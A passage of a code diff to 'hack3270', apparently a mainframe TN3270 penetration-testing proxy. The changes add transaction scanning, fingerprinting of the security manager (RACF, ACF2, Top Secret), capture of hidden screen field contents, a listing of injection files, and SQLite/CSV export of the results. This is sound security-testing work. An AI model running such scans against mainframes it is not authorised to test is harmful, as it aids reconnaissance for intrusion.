+        with open(csv_filename, "w", newline="") as csvfile:
+            writer = csv.writer(csvfile)
+            writer.writerow(['Timestamp', 'Transaction', 'Status', 'Response Preview', 'Response Length'])
+            for row in self.all_audit_results():
+                timestamp = float(row[1])
+                dt = datetime.datetime.fromtimestamp(timestamp)
+                writer.writerow([dt, row[2], row[3], row[4], row[5]])
+
+        self.logger.debug('Audit export finished: {}'.format(csv_filename))
+        return csv_filename
+
+    # ---- Single Transaction Scan Methods ----
+
+    def fingerprint_esm(self, server_data):
+        '''Detects the ESM (External Security Manager) from response patterns.'''
+        ascii_text = self.get_ascii(server_data).upper()
+        evidence = []
+
+        # RACF prefixes
+        for prefix in ['ICH408I', 'ICH409I', 'ICH70001I', 'IRR012I', 'IRR013I']:
+            if prefix in ascii_text:
+                evidence.append(prefix)
+        if evidence:
+            return {'esm': 'RACF', 'evidence': evidence}
+
+        # ACF2
+        for prefix in ['ACF2', 'ACF01']:
+            if prefix in ascii_text:
+                evidence.append(prefix)
+        if evidence:
+            return {'esm': 'ACF2', 'evidence': evidence}
+
+        # Top Secret
+        for prefix in ['TSS7000I', 'TSS7001I', 'TOP SECRET']:
+            if prefix in ascii_text:
+                evidence.append(prefix)
+        if evidence:
+            return {'esm': 'TOP_SECRET', 'evidence': evidence}
+
+        return {'esm': 'UNKNOWN', 'evidence': []}
+
+    def analyze_screen_fields(self, screen_map):
+        '''Analyzes screen_map for security-relevant field statistics.'''
+        total = len(screen_map)
+        input_count = 0
+        protected_count = 0
+        hidden_count = 0
+        numeric_count = 0
+        hidden_fields = []
+
+        for f in screen_map:
+            if f.get('type') == 'input':
+                input_count += 1
+            if f.get('protected'):
+                protected_count += 1
+            if f.get('numeric'):
+                numeric_count += 1
+            if f.get('hidden'):
+                hidden_count += 1
+                hidden_fields.append({
+                    'row': f.get('row', 0),
+                    'col': f.get('col', 0),
+                    'content': f.get('content', ''),
+                })
+
+        return {
+            'total': total,
+            'input': input_count,
+            'protected': protected_count,
+            'hidden': hidden_count,
+            'numeric': numeric_count,
+            'hidden_fields': hidden_fields,
+        }
+
+    def scan_analyze(self, server_data, txn_code, duration_ms):
+        '''Orchestrates all analyses on a single transaction response.'''
+        status = self.classify_response(server_data)
+        abends = self.detect_abend(server_data)
+        fields = self.parse_screen_map(server_data)
+        self.refresh_aids(server_data)
+        esm = self.fingerprint_esm(server_data)
+        field_analysis = self.analyze_screen_fields(fields)
+
+        # Build preview
+        ascii_text = self.get_ascii(server_data)
+        preview = re.sub(r'\[0x[0-9A-Fa-f]{2}\]', '', ascii_text).strip()[:200]
+
+        return {
+            'txn_code': txn_code,
+            'timestamp': time.time(),
+            'status': status,
+            'abends': abends,
+            'field_analysis': field_analysis,
+            'pf_keys': list(self.found_aids),
+            'esm': esm,
+            'response_len': len(server_data),
+            'duration_ms': round(duration_ms, 2),
+            'response_preview': preview,
+        }
+
+    def scan_send_txn(self, txn_code):
+        '''Sends CLEAR + transaction, waits for response. Returns (server_data, duration_ms).'''
+        try:
+            is_tn3270e = self.check_inject_3270e()
+
+            # Send CLEAR
+            self.server.send(self.build_clear_payload(is_tn3270e))
+            try:
+                rlist, _, _ = select.select([self.server], [], [], 0.3)
+                if self.server in rlist:
+                    clear_response = self.server.recv(BUFFER_MAX)
+                    self.client.send(clear_response)
+            except Exception:
+                pass
+
+            # Send transaction
+            payload = self.build_txn_payload(txn_code, is_tn3270e)
+            self.write_database_log('C', 'Scan: sending {}'.format(txn_code), payload)
+            self.server.send(payload)
+            start_time = time.time()
+
+            # Wait for response
+            rlist, _, _ = select.select([self.server], [], [], 3)
+            if self.server in rlist:
+                server_data = self.server.recv(BUFFER_MAX)
+                duration_ms = (time.time() - start_time) * 1000
+                self.client.send(server_data)
+                self.write_database_log('S', 'Scan response for {}'.format(txn_code), server_data)
+                return (server_data, duration_ms)
+        except Exception as e:
+            self.logger.error("Scan send error: {}".format(e))
+        return (None, 0)
+
+    def write_scan_result(self, report):
+        '''Writes a scan result to the database. Returns row ID.'''
+        self.sql_cur.execute(
+            "INSERT INTO ScanResults ('TIMESTAMP', 'TXN_CODE', 'STATUS', 'ABENDS', 'FIELD_ANALYSIS', 'PF_KEYS', 'ESM_TYPE', 'RESPONSE_LEN', 'DURATION_MS', 'RESPONSE_PREVIEW', 'FULL_REPORT') VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)",
+            (str(report['timestamp']), report['txn_code'], report['status'],
+             json.dumps(report.get('abends', [])),
+             json.dumps(report.get('field_analysis', {})),
+             json.dumps(report.get('pf_keys', [])),
+             report.get('esm', {}).get('esm', 'UNKNOWN'),
+             report.get('response_len', 0),
+             report.get('duration_ms', 0),
+             report.get('response_preview', ''),
+             json.dumps(report))
+        )
+        self.sql_con.commit()
+        return self.sql_cur.lastrowid
+
+    def all_scan_results(self, start=0):
+        '''Gets all scan results from database.'''
+        if start > 0:
+            self.sql_cur.execute("SELECT * FROM ScanResults WHERE ID > ?", (start,))
+        else:
+            self.sql_cur.execute("SELECT * FROM ScanResults")
+        return self.sql_cur.fetchall()
+
+    def export_scan_csv(self, csv_filename=False):
+        '''Exports scan results to CSV.'''
+        if not csv_filename:
+            csv_filename = self.project_name + "_scan.csv"
+
+        with open(csv_filename, "w", newline="") as csvfile:
+            writer = csv.writer(csvfile)
+            writer.writerow(['Timestamp', 'Transaction', 'Status', 'ESM', 'ABENDs',
+                             'Response Length', 'Duration (ms)', 'Response Preview'])
+            for row in self.all_scan_results():
+                timestamp = float(row[1])
+                dt = datetime.datetime.fromtimestamp(timestamp)
+                writer.writerow([dt, row[2], row[3], row[7], row[4], row[8], row[9], row[10]])
+
+        self.logger.debug('Scan export finished: {}'.format(csv_filename))
+        return csv_filename
+
+    def list_injection_files(self):
+        '''Lists available injection files from the injections/ directory'''
+        injection_dir = Path('injections')
+        if not injection_dir.is_dir():
+            return []
+        return sorted([f.name for f in injection_dir.iterdir()
+                       if f.is_file() and f.suffix == '.txt'])
+
     ## TCP/IP Functions
 
     def client_connect(self):
@@ -883,6 +1963,28 @@ class hack3270:
             
             self.write_database_log('S', log_line, server_data)
 
+            # PR2: Parse screen map
+            self.parse_screen_map(server_data)
+
+            # PR1: ABEND detection
+            if self.abend_detection:
+                abends = self.detect_abend(server_data)
+                for abend in abends:
+                    # Get the log ID of the record just written
+                    self.sql_cur.execute("SELECT MAX(ID) FROM Logs")
+                    log_id = self.sql_cur.fetchone()[0]
+                    self.write_abend_log(abend, log_id)
+                    # Annotate the log notes
+                    self.sql_cur.execute(
+                        "UPDATE Logs SET NOTES = NOTES || ? WHERE ID = ?",
+                        (' [ABEND: {}]'.format(abend['code']), log_id)
+                    )
+                    self.sql_con.commit()
+
+            # PR4: Security audit response processing
+            if self.audit_running and self.audit_current_txn:
+                self.audit_process_response(server_data)
+
     def tend_server(self):
         select_timeout = 1
         while True:
@@ -910,6 +2012,11 @@ class hack3270:
                     self.capture_mask(client_data)
                 else:
                     self.write_database_log('C', '', client_data)
+                    # PR3: Transaction correlation - detect outgoing transaction
+                    if self.transaction_tracking:
+                        txn_code = self.detect_transaction_code(client_data)
+                        if txn_code:
+                            self.start_transaction(txn_code)
                 self.server.send(client_data)
 
         # Tend to server sending data
@@ -921,6 +2028,9 @@ class hack3270:
                 self.logger.debug("Server: {}".format(self.get_ascii(self.server_data)))
                 self.handle_server(self.server_data)
                 self.refresh_aids(self.server_data)
+                # PR3: Complete pending transaction
+                if self.transaction_tracking and self.pending_transaction:
+                    self.complete_transaction(self.server_data)
 
         if self.hack_toggled or self.hack_color_toggled: # Resend data to client if either of these options are toggled.
 
